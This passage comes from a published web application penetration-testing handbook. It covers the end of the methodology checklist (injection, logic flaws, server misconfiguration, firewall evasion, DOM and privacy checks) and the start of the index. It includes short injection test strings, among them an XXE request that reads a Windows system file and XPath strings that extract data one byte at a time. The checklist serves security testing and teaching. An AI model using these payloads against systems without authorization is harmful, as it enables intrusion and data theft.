%1!s!%2!s!%3!s!%4!s!%5!s!%6!s!%7!s!%8!s!%9!s!%10!s! etc...
Remember to URL-encode the % character as %25.
 8.2.3.2 Monitor the application‚Äôs responses for anomalous events, as described 
in step 8.2.1.2.
c21.indd 838 c21.indd 838 8/19/2011 12:22:05 PM 8/19/2011 12:22:05 PM
Stuttard c21.indd V3 - 08/16/2011 Page 839
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 839
8.3 Test for SOAP Injection
 8.3.1 Target each parameter in turn that you suspect is being processed via 
a SOAP message. Submit a rogue XML closing tag, such as </foo>. If 
no error occurs, your input is probably not being inserted into a SOAP 
message or is being sanitized in some way.
 8.3.2 If an error was received, submit instead a valid opening and closing 
tag pair, such as <foo></foo>. If this causes the error to disappear, the 
application may be vulnerable.
 8.3.3 If the item you submit is copied back into the application‚Äôs responses, 
submit the following two values in turn. If you fi nd that either item is 
returned as the other, or as simply test, you can be confi dent that your 
input is being inserted into an XML-based message.
test<foo/>
test<foo></foo>
 8.3.4 If the HTTP request contains several parameters that may be being 
placed into a SOAP message, try inserting the opening comment character <!-- into one parameter and the closing comment character !-->
into another parameter. Then switch these (because you have no way 
of knowing in which order the parameters appear). This can have the 
effect of commenting out a portion of the server‚Äôs SOAP message, which 
may change the application‚Äôs logic or result in a different error condition 
that may divulge information.
8.4 Test for LDAP Injection
 8.4.1 In any functionality where user-supplied data is used to retrieve information from a directory service, target each parameter in turn to test 
for potential injection into an LDAP query.
 8.4.2 Submit the * character. If a large number of results are returned, this is 
a good indicator that you are dealing with an LDAP query.
 8.4.3 Try entering a number of closing parentheses:
))))))))))
This input invalidates the query syntax, so if an error or other anomalous 
behavior results, the application may be vulnerable (although many 
other application functions and injection situations may behave in the 
same way).
 8.4.4 Try entering various expressions designed to interfere with different 
types of queries, and see if these allow you to infl uence the results being 
c21.indd 839 c21.indd 839 8/19/2011 12:22:05 PM 8/19/2011 12:22:05 PM
Stuttard c21.indd V3 - 08/16/2011 Page 840
840 Chapter 21 n A Web Application Hacker‚Äôs Methodology
returned. The cn attribute is supported by all LDAP implementations 
and is useful if you do not know any details about the directory you are 
querying:
)(cn=*
*))(|(cn=*
*))%00
 8.4.5 Try adding extra attributes to the end of your input, using commas to 
separate each item. Test each attribute in turn. An error indicates that 
the attribute is not valid in the present context. The following attributes 
are commonly used in directories queried by LDAP:
cn
c
mail
givenname
o
ou
dc
l
uid
objectclass
postaladdress
dn
sn
8.5 Test for XPath Injection
 8.5.1 Try submitting the following values, and determine whether they result 
in different application behavior without causing an error:
‚Äò or count(parent::*[position()=1])=0 or ‚Äòa‚Äô=‚Äôb
‚Äò or count(parent::*[position()=1])>0 or ‚Äòa‚Äô=‚Äôb
 8.5.2 If the parameter is numeric, also try the following test strings:
1 or count(parent::*[position()=1])=0
1 or count(parent::*[position()=1])>0
 8.5.3 If any of the preceding strings causes differential behavior within the 
application without causing an error, it is likely that you can extract 
arbitrary data by crafting test conditions to extract 1 byte of information 
at a time. Use a series of conditions with the following form to determine 
the name of the current node‚Äôs parent:
substring(name(parent::*[position()=1]),1,1)=‚Äôa‚Äô
c21.indd 840 c21.indd 840 8/19/2011 12:22:05 PM 8/19/2011 12:22:05 PM
Stuttard c21.indd V3 - 08/16/2011 Page 841
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 841
 8.5.4 Having extracted the name of the parent node, use a series of conditions 
with the following form to extract all the data within the XML tree:
substring(//parentnodename[position()=1]/child::node()[position()=1]
/text(),1,1)=‚Äôa‚Äô
8.6 Test for Back-End Request Injection
 8.6.1 Locate any instance where an internal server name or IP address is 
specifi ed in a parameter. Submit an arbitrary server and port, and 
monitor the application for a timeout. Also submit localhost, and 
fi nally your own IP address, monitoring for incoming connections on 
the port specifi ed.
 8.6.2 Target a request parameter that returns a specifi c page for a specifi c 
value, and try to append a new injected parameter using various syntax, 
including the following:
%26foo%3dbar (URL-encoded &foo=bar)
%3bfoo%3dbar (URL-encoded ;foo=bar)
%2526foo%253dbar (Double URL-encoded &foo=bar)
If the application behaves as if the original parameter were unmodifi ed, 
there is a chance of HTTP parameter injection vulnerabilities. Attempt 
to attack the back-end request by injecting known parameter name/
value pairs that may alter the back-end logic, as described in Chapter 10.
8.7 Test for XXE Injection
 8.7.1 If users are submitting XML to the server, an external entity injection 
attack may be possible. If a fi eld is known that is returned to the user, 
attempt to specify an external entity, as in the following example:
POST /search/128/AjaxSearch.ashx HTTP/1.1
Host: mdsec.net
Content-Type: text/xml; charset=UTF-8
Content-Length: 115
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ‚Äúfile:///windows/win.ini‚Äù > ]>
<Search><SearchTerm>&xxe;</SearchTerm></Search>
If no known field can be found, specify an external entity of 
‚Äúhttp://192.168.1.1:25‚Äù and monitor the page response time. If the 
page takes signifi cantly longer to return or times out, it may be vulnerable.
c21.indd 841 c21.indd 841 8/19/2011 12:22:05 PM 8/19/2011 12:22:05 PM
Stuttard c21.indd V3 - 08/16/2011 Page 842
842 Chapter 21 n A Web Application Hacker‚Äôs Methodology
9 Test for Logic Flaws
Figure 21-10: Testing for logic flaws
9.1. Identify key attack surface
9.2.
Multistage
processes
9.3.
Incomplete
input
9.4.
Trust
boundaries
9.5.
Transaction
logic
9.1 Identify the Key Attack Surface
 9.1.1 Logic fl aws can take a huge variety of forms and exist within any aspect 
of the application‚Äôs functionality. To ensure that probing for logic fl aws 
is feasible, you should fi rst narrow down the attack surface to a reasonable area for manual testing.
 9.1.2 Review the results of your application mapping exercises, and identify 
any instances of the following features:
n Multistage processes
n Critical security functions, such as login
n Transitions across trust boundaries (for example, moving from being 
anonymous to being self-registered to being logged in)
n Context-based functionality presented to a user
n Checks and adjustments made to transaction prices or quantities
9.2 Test Multistage Processes
 9.2.1 When a multistage process involves a defi ned sequence of requests, 
attempt to submit these requests out of the expected sequence. Try 
skipping certain stages, accessing a single stage more than once, and 
accessing earlier stages after later ones.
 9.2.2 The sequence of stages may be accessed via a series of GET or POST
requests for distinct URLs, or they may involve submitting different 
sets of parameters to the same URL. You may specify the stage being 
c21.indd 842 c21.indd 842 8/19/2011 12:22:05 PM 8/19/2011 12:22:05 PM
Stuttard c21.indd V3 - 08/16/2011 Page 843
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 843
requested by submitting a function name or index within a request 
parameter. Be sure to understand fully the mechanisms that the application is employing to deliver access to distinct stages.
 9.2.3 In addition to interfering with the sequence of steps, try taking parameters that are submitted at one stage of the process and submitting them 
at a different stage. If the relevant items of data are updated within the 
application‚Äôs state, you should investigate whether you can leverage 
this behavior to interfere with the application‚Äôs logic.
 9.2.4 If a multistage process involves different users performing operations 
on the same set of data, try taking each parameter submitted by one user 
and submitting it as another. If they are accepted and processed as that 
user, explore the implications of this behavior, as described previously.
 9.2.5 From the context of the functionality that is implemented, try to understand what assumptions the developers may have made and where the 
key attack surface lies. Try to identify ways of violating those assumptions to cause undesirable behavior within the application.
 9.2.6 When multistage functions are accessed out of sequence, it is common 
to encounter a variety of anomalous conditions within the application, 
such as variables with null or uninitialized values, partially defi ned or 
inconsistent state, and other unpredictable behavior. Look for interesting error messages and debug output, which you can use to better 
understand the application‚Äôs internal workings and thereby fi ne-tune 
the current or a different attack.
9.3 Test Handling of Incomplete Input
 9.3.1 For critical security functions within the application, which involve 
processing several items of user input and making a decision based on 
these, test the application‚Äôs resilience to requests containing incomplete 
input.
 9.3.2 For each parameter in turn, remove both the name and value of the 
parameter from the request. Monitor the application‚Äôs responses for 
any divergence in its behavior and any error messages that shed light 
on the logic being performed.
 9.3.3 If the request you are manipulating is part of a multistage process, follow 
the process through to completion, because the application may store 
data submitted in earlier stages within the session and then process this 
at a later stage.
c21.indd 843 c21.indd 843 8/19/2011 12:22:05 PM 8/19/2011 12:22:05 PM
Stuttard c21.indd V3 - 08/16/2011 Page 844
844 Chapter 21 n A Web Application Hacker‚Äôs Methodology
9.4 Test Trust Boundaries
 9.4.1 Probe how the application handles transitions between different types 
of trust of the user. Look for functionality where a user with a given 
trust status can accumulate an amount of state relating to his identity. 
For example, an anonymous user could provide personal information 
during self-registration, or proceed through part of an account recovery 
process designed to establish his identity.
 9.4.2 Try to fi nd ways to make improper transitions across trust boundaries 
by accumulating relevant state in one area and then switching to a 
different area in a way that would not normally occur. For example, 
having completed part of an account recovery process, attempt to 
switch to an authenticated user-specifi c page. Test whether the application assigns you an inappropriate level of trust when you transition 
in this way.
 9.4.3 Try to determine whether you can harness any higher-privileged function directly or indirectly to access or infer information.
9.5 Test Transaction Logic
 9.5.1 In cases where the application imposes transaction limits, test the 
effects of submitting negative values. If these are accepted, it may be 
possible to beat the limits by making large transactions in the opposite 
direction.
 9.5.2 Examine whether you can use a series of successive transactions to bring 
about a state that you can exploit for a useful purpose. For example, you 
may be able to perform several low-value transfers between accounts 
to accrue a large balance that the application‚Äôs logic was intended to 
prevent.
 9.5.3 If the application adjusts prices or other sensitive values based on criteria 
that are determined by user-controllable data or actions, fi rst understand 
the algorithms used by the application, and the point within its logic 
where adjustments are made. Identify whether these adjustments are 
made on a one-time basis, or whether they are revised in response to 
further actions performed by the user.
 9.5.4 Try to fi nd ways to manipulate the application‚Äôs behavior to cause it to 
get into a state where the adjustments it has applied do not correspond 
to the original criteria intended by its designers.
c21.indd 844 c21.indd 844 8/19/2011 12:22:05 PM 8/19/2011 12:22:05 PM
Stuttard c21.indd V3 - 08/16/2011 Page 845
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 845
10 Test for Shared Hosting Vulnerabilities
Figure 21-11: Testing for shared hosting vulnerabilities
10.1. Test segregation in shared infrastructures
10.2. Test segregation between ASP-hosted applications
10.1 Test Segregation in Shared Infrastructures
 10.1.1 If the application is hosted in a shared infrastructure, examine the access 
mechanisms provided for customers of the shared environment to update 
and manage their content and functionality. Consider the following 
questions:
n Does the remote access facility use a secure protocol and suitably 
hardened infrastructure?
n Can customers access files, data, and other resources that they do not 
legitimately need to access?
n Can customers gain an interactive shell within the hosting environment and execute arbitrary commands?
 10.1.2 If a proprietary application is used to allow customers to confi gure and 
customize a shared environment, consider targeting this application as 
a way to compromise the environment itself and individual applications 
running within it.
 10.1.3 If you can achieve command execution, SQL injection, or arbitrary fi le 
access within one application, investigate carefully whether this provides 
any way to escalate your attack to target other applications.
10.2 Test Segregation Between ASP-Hosted Applications
 10.2.1 If the application belongs to an ASP-hosted service composed of a 
mix of shared and customized components, identify any shared components such as logging mechanisms, administrative functions, and 
database code components. Attempt to leverage these to compromise 
the shared portion of the application and thereby attack other individual 
applications.
c21.indd 845 c21.indd 845 8/19/2011 12:22:05 PM 8/19/2011 12:22:05 PM
Stuttard c21.indd V3 - 08/16/2011 Page 846
846 Chapter 21 n A Web Application Hacker‚Äôs Methodology
 10.2.2 If a common database is used within any kind of shared environment, 
perform a comprehensive audit of the database confi guration, patch level, 
table structure, and permissions using a database scanning tool such as 
NGSSquirrel. Any defects within the database security model may provide a way to escalate an attack from within one application to another.
11 Test for Application Server Vulnerabilities
Figure 21-12: Testing for web server vulnerabilities
11.1. Test for default credentials
11.2. Test for default content
11.3. Test for dangerous HTTP methods
11.4. Test for proxy functionality
11.5. Test for virtual hosting misconfiguration
11.6. Test for web server software bugs
11.7. Test for web application firewalling
11.1 Test for Default Credentials
 11.1.1 Review the results of your application mapping exercises to identify the 
web server and other technologies in use that may contain accessible 
administrative interfaces.
 11.1.2 Perform a port scan of the web server to identify any administrative 
interfaces running on a different port than the main target application.
 11.1.3 For any identifi ed interfaces, consult the manufacturer‚Äôs documentation 
and common default password listings to obtain default credentials.
 11.1.4 If the default credentials do not work, use the steps listed in section 4 
to attempt to guess valid credentials.
 11.1.5 If you gain access to an administrative interface, review the available 
functionality and determine whether it can be used to further compromise the host and attack the main application.
c21.indd 846 c21.indd 846 8/19/2011 12:22:05 PM 8/19/2011 12:22:05 PM
Stuttard c21.indd V3 - 08/16/2011 Page 847
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 847
11.2 Test for Default Content
 11.2.1 Review the results of your Nikto scan (step 1.4.1) to identify any default 
content that may be present on the server but that is not an integral part 
of the application.
 11.2.2 Use search engines and other resources such as www.exploit-db.com and 
www.osvdb.org to identify default content and functionality included 
within the technologies you know to be in use. If feasible, carry out a 
local installation of these, and review them for any default functionality 
that you may be able to leverage in your attack.
 11.2.3 Examine the default content for any functionality or vulnerabilities that 
you may be able to leverage to attack the server or the application.
11.3 Test for Dangerous HTTP Methods
 11.3.1 Use the OPTIONS method to list the HTTP methods that the server states 
are available. Note that different methods may be enabled in different 
directories. You can perform a vulnerability scan in Paros to perform 
this check.
 11.3.2 Try each reported method manually to confi rm whether it can in fact be 
used.
 11.3.3 If you fi nd that some WebDAV methods are enabled, use a WebDAVenabled client for further investigation, such as Microsoft FrontPage or 
the Open as Web Folder option in Internet Explorer.
11.4 Test for Proxy Functionality
 11.4.1 Using both GET and CONNECT requests, try to use the web server as a 
proxy to connect to other servers on the Internet and retrieve content 
from them.
 11.4.2 Using both GET and CONNECT requests, attempt to connect to different IP 
addresses and ports within the hosting infrastructure.
 11.4.3 Using both GET and CONNECT requests, attempt to connect to common 
port numbers on the web server itself by specifying 127.0.0.1 as the target 
host in the request.
11.5 Test for Virtual Hosting Misconfi guration
 11.5.1 Submit GET requests to the root directory using the following:
n The correct Host header
n A bogus Host header
c21.indd 847 c21.indd 847 8/19/2011 12:22:06 PM 8/19/2011 12:22:06 PM
Stuttard c21.indd V3 - 08/16/2011 Page 848
848 Chapter 21 n A Web Application Hacker‚Äôs Methodology
n The server‚Äôs IP address in the Host header
n No Host header (use HTTP/1.0 only)
 11.5.2 Compare the responses to these requests. A common result is that directory listings are obtained when the server‚Äôs IP address is used in the Host
header. You may also fi nd that different default content is accessible.
 11.5.3 If you observe different behavior, repeat the application mapping exercises described in section 1 using the hostname that generated different 
results. Be sure to perform a Nikto scan using the -vhost option to identify any default content that may have been overlooked during initial 
application mapping.
11.6 Test for Web Server Software Bugs
 11.6.1 Run Nessus and any other similar scanners you have available to identify 
any known vulnerabilities in the web server software you are attacking.
 11.6.2 Review resources such as Security Focus, Bugtraq, and Full Disclosure 
to fi nd details of any recently discovered vulnerabilities that may not 
have been fi xed on your target.
 11.6.3 If the application was developed by a third party, investigate whether it 
ships with its own web server (often an open source server). If it does, 
investigate this for any vulnerabilities. Be aware that in this case, the 
server‚Äôs standard banner may have been modifi ed.
 11.6.4 If possible, consider performing a local installation of the software you 
are attacking, and carry out your own testing to fi nd new vulnerabilities 
that have not been discovered or widely circulated.
11.7 Test for Web Application Firewalling
 11.7.1 Submit an arbitrary parameter name to the application with a clear attack 
payload in the value, ideally somewhere the application includes the 
name and/or value in the response. If the application blocks the attack, 
this is likely to be due to an external defense.
 11.7.2 If a variable can be submitted that is returned in a server response, submit 
a range of fuzz strings and encoded variants to identify the behavior of 
the application defenses to user input.
 11.7.3 Confi rm this behavior by performing the same attacks on variables 
within the application.
 11.7.4 For all fuzzing strings and requests, use payload strings that are unlikely 
to exist in a standard signature database. Although giving examples of 
c21.indd 848 c21.indd 848 8/19/2011 12:22:06 PM 8/19/2011 12:22:06 PM
Stuttard c21.indd V3 - 08/16/2011 Page 849
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 849
these is by defi nition impossible, avoid using /etc/passwd or /windows/
system32/config/sam as payloads for fi le retrieval. Also avoid using 
terms such as <script> in an XSS attack and using alert() or xss as 
XSS payloads.
 11.7.5 If a particular request is blocked, try submitting the same parameter in a 
different location or context. For instance, submit the same parameter in 
the URL in a GET request, within the body of a POST request, and within 
the URL in a POST request.
 11.7.6 On ASP.NET, also try submitting the parameter as a cookie. The API 
Request.Params[‚Äúfoo‚Äù] will retrieve the value of a cookie named foo
if the parameter foo is not found in the query string or message body.
 11.7.7 Review all the other methods of introducing user input provided in 
Chapter 4, picking any that are not protected.
 11.7.8 Determine locations where user input is (or can be) submitted in a nonstandard format such as serialization or encoding. If none is available, 
build the attack string by concatenation and/or by spanning it across 
multiple variables. (Note that if the target is ASP.NET, you may be able 
to use HPP to concatenate the attack using multiple specifi cations of the 
same variable.)
12 Miscellaneous Checks
Figure 21-13: Miscellaneous checks
12.1. Test for DOM-based attacks
12.2. Test for local privacy vulnerabilities
12.3. Test for weak SSL ciphers
12.4. Check same-orgin policy configuration
12.1 Check for DOM-Based Attacks
 12.1.1 Perform a brief code review of every piece of JavaScript received from 
the application. Identify any XSS or redirection vulnerabilities that can 
be triggered by using a crafted URL to introduce malicious data into 
the DOM of the relevant page. Include all standalone JavaScript fi les 
c21.indd 849 c21.indd 849 8/19/2011 12:22:06 PM 8/19/2011 12:22:06 PM
Stuttard c21.indd V3 - 08/16/2011 Page 850
850 Chapter 21 n A Web Application Hacker‚Äôs Methodology
and scripts contained within HTML pages (both static and dynamically 
generated).
 12.1.2 Identify all uses of the following APIs, which may be used to access 
DOM data that can be controlled via a crafted URL:
document.location
document.URL
document.URLUnencoded
document.referrer
window.location
 12.1.3 Trace the relevant data through the code to identify what actions are 
performed with it. If the data (or a manipulated form of it) is passed to 
one of the following APIs, the application may be vulnerable to XSS:
document.write()
document.writeln()
document.body.innerHtml
eval()
window.execScript()
window.setInterval()
window.setTimeout()
 12.1.4 If the data is passed to one of the following APIs, the application may 
be vulnerable to a redirection attack:
document.location
document.URL
document.open()
window.location.href
window.navigate()
window.open()
12.2 Check for Local Privacy Vulnerabilities
 12.2.1 Review the logs created by your intercepting proxy to identify all the 
Set-Cookie directives received from the application during your testing. If any of these contains an expires attribute with a date that is in 
the future, the cookie will be stored by users‚Äô browsers until that date. 
Review the contents of any persistent cookies for sensitive data.
 12.2.2 If a persistent cookie is set that contains any sensitive data, a local attacker 
may be able to capture this data. Even if the data is encrypted, an attacker 
who captures it will be able to resubmit the cookie to the application 
and gain access to any data or functionality that this allows.
 12.2.3 If any application pages containing sensitive data are accessed over 
HTTP, look for any cache directives within the server‚Äôs responses. If any 
of the following directives do not exist (either within the HTTP headers 
c21.indd 850 c21.indd 850 8/19/2011 12:22:06 PM 8/19/2011 12:22:06 PM
Stuttard c21.indd V3 - 08/16/2011 Page 851
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 851
or within HTML metatags), the page concerned may be cached by one 
or more browsers:
Expires: 0
Cache-control: no-cache
Pragma: no-cache
 12.2.4 Identify any instances within the application in which sensitive data is 
transmitted via a URL parameter. If any cases exist, examine the browser 
history to verify that this data has been stored there.
 12.2.5 For all forms that are used to capture sensitive data from the user (such 
as credit card details), review the form‚Äôs HTML source. If the attribute 
autocomplete=off is not set, within either the form tag or the tag for the 
individual input fi eld, data entered is stored within browsers that support autocomplete, provided that the user has not disabled this feature.
 12.2.6 Check for technology-specifi c local storage.
 12.2.6.1 Check for Flash local objects using the BetterPrivacy plug-in 
for Firefox.
 12.2.6.2 Check any Silverlight isolated storage in this directory:
C:\Users\{username}\AppData\LocalLow\Microsoft\
Silverlight\
 12.2.6.3 Check any use of HTML5 local storage.
12.3 Check for Weak SSL Ciphers
 12.3.1 If the application uses SSL for any of its communications, use the tool 
THCSSLCheck to list the ciphers and protocols supported.
 12.3.2 If any weak or obsolete ciphers and protocols are supported, a suitably 
positioned attacker may be able to perform an attack to downgrade or 
decipher the SSL communications of an application user, gaining access 
to his sensitive data.
 12.3.3 Some web servers advertise certain weak ciphers and protocols as supported but refuse to actually complete a handshake using these if a 
client requests them. This can lead to false positives when you use the 
THCSSLCheck tool. You can use the Opera browser to attempt to perform a complete handshake using specifi ed weak protocols to confi rm 
whether these can actually be used to access the application.
12.4 Check Same-Origin Policy Confi guration
 12.4.1 Check for the /crossdomain.xml fi le. If the application allows unrestricted 
access (by specifying <allow-access-from domain=‚Äù*‚Äù />), Flash objects 
c21.indd 851 c21.indd 851 8/19/2011 12:22:06 PM 8/19/2011 12:22:06 PM
Stuttard c21.indd V3 - 08/16/2011 Page 852
852 Chapter 21 n A Web Application Hacker‚Äôs Methodology
from any other site can perform two-way interaction, riding on the sessions of application users. This would allow all data to be retrieved, and 
any user actions to be performed, by any other domain.
 12.4.2 Check for the /clientaccesspolicy.xml fi le. Similar to Flash, if the 
<cross-domain-access> confi guration is too permissive, other sites 
can perform two-way interaction with the site under assessment.
 12.4.3 Test an application‚Äôs handling of cross-domain requests using 
XMLHttpRequest by adding an Origin header specifying a different 
domain and examining any Access-Control headers that are returned. 
The security implications of allowing two-way access from any domain, 
or from specifi ed other domains, are the same as those described for the 
Flash cross-domain policy.
13 Follow Up Any Information Leakage
 13.1 In all your probing of the target application, monitor its responses for 
error messages that may contain useful information about the error‚Äôs 
cause, the technologies in use, and the application‚Äôs internal structure 
and functionality.
 13.2 If you receive any unusual error messages, investigate these using standard search engines. You can use various advanced search features to 
narrow down your results. For example:
‚Äúunable to retrieve‚Äù filetype:php
 13.3 Review the search results, looking both for any discussion about the 
error message and for any other websites in which the same message has 
appeared. Other applications may produce the same message in a more 
verbose context, enabling you to better understand what kind of conditions 
give rise to the error. Use the search engine cache to retrieve examples 
of error messages that no longer appear within the live application.
 13.4 Use Google code search to locate any publicly available code that may 
be responsible for a particular error message. Search for snippets of error 
messages that may be hard-coded into the application‚Äôs source code. 
You can also use various advanced search features to specify the code 
language and other details, if these are known. For example:
unable\ to\ retrieve lang:php package:mail
 13.5 If you receive error messages with stack traces containing the names 
of library and third-party code components, search for these names on 
both types of search engine.
c21.indd 852 c21.indd 852 8/19/2011 12:22:06 PM 8/19/2011 12:22:06 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 853
853
A
Absinthe, 322
absolute URLs, open redirection 
vulnerabilities
blocking, 544‚Äì545
prefi x, 545‚Äì546
‚Äúaccept known good‚Äù approach, 
input, 24
access
ASP attackers, 658‚Äì660
ASP.NET API methods
database, 721
fi le, 720
ASPs and customer, 665‚Äì666
database
ASP.NET API methods, 721
Java API methods, 714‚Äì715
Perl language API methods, 
737‚Äì738
PHP API methods, 729‚Äì730
defense mechanisms handling, 
18‚Äì21
authentication, 18‚Äì19
control, 20‚Äì21
session management, 19‚Äì20
Java API methods
database, 714‚Äì715
fi le, 713
Perl language API methods
database, 737‚Äì738
fi le, 737
PHP API methods
database, 729‚Äì730
fi le, 727‚Äì729
shared hosting
attackers, 658‚Äì660
customer, 665‚Äì666
trust relationships in tiered 
architecture, 649
access controls
account testing, 267‚Äì270
API methods, 276‚Äì277
HTTP methods, 278
limited access, 273‚Äì276
multistage function, 271‚Äì273
static resources, 277
application mapping, 268‚Äì269
attackers, 266‚Äì278
types, 258‚Äì260
usernames and passwords, 
275‚Äì276
back-end components, 357
broken, 7, 274
context-dependent, 258
declarative, 282‚Äì283
defective, 257
discretionary, 282
fl aws, 284
hacker‚Äôs methodology
insecure access, 823
limited access, 822‚Äì823
multiple accounts, 822
requirements, 821
horizontal, 258
identifi er-based functions, 
261‚Äì262
insecure methods, 265‚Äì266
location-based, 266
multistage functions, 262‚Äì263
testing, 271‚Äì273
parameter-based, 265‚Äì266
per-user segregation, 274
platforms, 264‚Äì265
programmatic, 282
referer-based, 266
role-based, 282
security, 278‚Äì283
best practices, 279‚Äì280
central component approach, 
280
multilayered privilege 
model, 280‚Äì283
pitfalls, 278‚Äì279
static resources, 263‚Äì264
account testing, 277
unprotected functionality, API 
methods, 260‚Äì261
vertical, 258
vulnerabilities, 258‚Äì266, 276
application logic fl aws, 411
Access-Control-AllowOrigin headers, 528‚Äì529
account activation URLs, 184
account suspension, 197‚Äì198
account testing, access controls, 
267‚Äì270
API methods, 276‚Äì277
HTTP methods, 278
limited access, 273‚Äì276
multistage function, 271‚Äì273
static resources, 277
Achilles proxy, 751
Action Message Format (AMF), 
135
Burp Suite, 137
active scanning, 764‚Äì765
ActiveX controls, 447
COMRaider, 558
Index
bindex.indd 853 bindex.indd 853 8/19/2011 12:01:35 PM 8/19/2011 12:01:35 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 854
854 Index n A‚ÄìA
hacker‚Äôs methodology, browser 
extensions, 804
HTML modifi cation, 557
‚Äúsafe for scripting‚Äù 
registration, 555‚Äì557
vulnerabilities, 555‚Äì556
fi nding, 556‚Äì558
preventing, 558‚Äì559
administrative functions, web 
applications, 35‚Äì36
administrators
DBA, 325‚Äì326
defense mechanisms handling 
attackers, alerting, 33‚Äì34
Ajax
HTML5, 487
stored XSS in uploaded fi les 
via, 486‚Äì487
web functionality, 62‚Äì63, 384
Alcon, Wade, 565
alerts, 33‚Äì34
Allaire JRun, 690‚Äì691
allow_url_include, 729
AMF. See Action Message 
Format
ampersand character, batch 
function, 360‚Äì361, 363
Anley, Chris, 218, 322, 634
anomalous event alerts, 33
anti-CSRF tokens, 508‚Äì509, 
516‚Äì517
XSS defeating, 509‚Äì510
anti-XSS fi lters, 452
IE, 748
AOL AIM Enterprise Gateway 
application, 409
Apache
chunked encoding overfl ow, 
688
error messages, 628
mod_isapi, 688
mod_proxy, 688
refl ected XSS, 442
Tomcat, 673
virtual hosting, 683
API methods
access controls to, 260‚Äì261
account testing, 276‚Äì277
ASP.NET
database, 721
dynamic code execution, 722
fi le access, 720
OS command execution, 
722‚Äì723
sockets, 723
URL redirection, 723
user input, 718‚Äì719
Java
database access, 714‚Äì715
dynamic code execution, 715
fi le access, 713
OS command execution, 
715‚Äì716
potentially dangerous, 
713‚Äì716
sockets, 716
URL redirection, 716
Java user input, 712
JavaScript DOM-based, 740
Perl language
database access, 737‚Äì738
dynamic code execution, 738
fi le access, 737
OS command execution, 738
potentially dangerous, 
736‚Äì739
sockets, 739
URL redirection, 738
PHP
database access, 729‚Äì730
dynamic code execution, 
730‚Äì731
fi le access, 727‚Äì729
OS command execution, 731
potentially dangerous, 
727‚Äì732
sockets, 732
URL redirection, 731‚Äì732
server-side redirection, 392
SQL injection, 291
versatility, 358
Apple iDisk Server, path 
traversal vulnerabilities, 690
application. See web application
application architecture. See
tiered architectures
application logic fl aws
access controls vulnerabilities, 
411
attack surface, 405
audit trail, 429
authentication, 415‚Äì416
avoiding, 428‚Äì429
beating business limit, 416‚Äì417, 
429
breaking bank, 414‚Äì416
bulk discount cheating, 418, 429
debugger messages, 424‚Äì426
developers, 429‚Äì430
encryption oracle, 407‚Äì408
‚Äúremember me‚Äù function, 407
escaping, 419‚Äì420
fi nancial services, 412‚Äì416
forced browsing, 411
hacker‚Äôs methodology
attack surface, 842
incomplete input, 843
multistage functions, 
842‚Äì843
transaction logic, 844
trust relationships, 844
hacker‚Äôs methodology, 
authentication, 811‚Äì813
invalidating input validation, 
420‚Äì422
lessons, 428‚Äì429
login function, 426‚Äì427
race conditions, 427
nature of, 406
password change function, 
409‚Äì410
proceeding to checkout, 
410‚Äì411
real-world, 406‚Äì407
rolling your own insurance, 
412‚Äì413
search function, 429
abuse, 422‚Äì424
security, 428
session management, 429
shell metacharacters, 419
source code, 428
SQL injection, 420‚Äì422
application logs, 262
application mapping, 73
access controls, 268‚Äì269
analyzing, 97‚Äì113
key areas, 97‚Äì98
attack surface, 111
example, 112‚Äì113
Burp Suite, 268
comparisons, 268‚Äì269
enumerating content and 
functionality, 74‚Äì97
hacker‚Äôs methodology, 795‚Äì798
debug parameters, 798
default content, 797
enumerating identifi ers, 
797‚Äì798
hidden content, 796‚Äì797
public information resources, 
796
tokens to sessions, 818
visible content, 795‚Äì796
hidden content
brute-force techniques 
discovering, 81‚Äì85
discovering, 80‚Äì93
inference from published 
content discovering, 
85‚Äì89
bindex.indd 854 bindex.indd 854 8/19/2011 12:01:35 PM 8/19/2011 12:01:35 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 855
 Index n A‚ÄìA 855
public information 
discovering, 89‚Äì91
web server leveraged for 
discovering, 91‚Äì93
hidden parameters, 96‚Äì97
input entry points
HTTP headers, 100‚Äì101
out-of-band channels, 101
request parameters, 99
URL fi le paths, 98‚Äì99
methodology, 114
naming schemes, 85‚Äì86
brute-force exercise, 88
identifying, 87
path traversal vulnerabilities, 
371
server-side
functionality identifi cation, 
106‚Äì110
technology identifi cation, 
101‚Äì106
web application pages versus
functional paths, 93‚Äì96
application servers. See web 
servers
application service providers 
(ASPs), 656‚Äì657. See also ASP.
NET; cloud computing
attackers, 658‚Äì665
access, 658‚Äì660
deliberate backdoor scripts, 
660‚Äì661
between web applications, 
660‚Äì663
fi nancial services, 658
organization, 658
securing, 665‚Äì667
component segregation, 667
customer access, 665‚Äì666
customer functionality 
segregation, 666
shared, 657‚Äì658
threats, 657
VPN, 659
arbitrary input. See user input
architecture. See tiered 
architectures
Armstrong, Dave, 505
The Art of Software Security
Assessment (Dowd & 
McDonald & Schuh), 634
ASCII code, 67
US-ASCII, 464
Asirra puzzles, Microsoft, 612
ASP.NET, 54, 103
API methods
database, 721
dynamic code execution, 722
fi le access, 720
OS command execution, 
722‚Äì723
sockets, 723
URL redirection, 723
user input, 718‚Äì719
error messages, 628
OS command injection via, 
360‚Äì361
redirection, 392
security confi guration, 723‚Äì724
session interaction, 719‚Äì720
stack traces, 617
ViewState
attackers, 127
Base64 encoding, 125‚Äì126
Burp Suite, 126
client-side data transmission, 
124‚Äì127
purpose, 125
security, 155
ASPs. See application service 
providers
.aspx fi le extension, 107
Astely, Rick, 541
attack payloads, XSS, 443‚Äì447
autocomplete, 446
escalating client-side, 447
escalation to other pages, 
473‚Äì474
inducing actions, 445‚Äì446
Trojan injection, 444‚Äì445
trust relationship exploitation, 
446‚Äì447
virtual defacement, 443‚Äì444
attack surface
application logic fl aws, 405
application mapping, 111
example, 112‚Äì113
hacker‚Äôs methodology, 
application logic fl aws, 
842
hacker‚Äôs methodology 
mapping, 800
attackers. See also specifi c attacks
access controls, 266‚Äì278
types, 258‚Äì260
usernames and passwords, 
275‚Äì276
ASP.NET ViewState, 127
ASPs, 658‚Äì665
access, 658‚Äì660
